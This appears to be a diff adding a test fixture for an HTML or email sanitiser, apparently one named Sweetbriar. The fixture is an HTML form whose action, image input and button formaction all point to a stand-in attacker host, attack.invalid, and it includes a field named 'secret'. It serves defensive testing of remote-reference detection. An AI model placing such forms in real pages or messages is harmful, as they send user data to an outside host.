@@ -1,0 +1,6 @@
+X-Sweetbriar-Fixture: Forms and successful controls
+X-Sweetbriar-Expect: remote
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<form action="https://attack.invalid/send"><input name="secret" value="x"><input type=image src="https://attack.invalid/image"><button formaction="https://attack.invalid/go">go</button><select><option>x</option></select><textarea>secret</textarea></form>
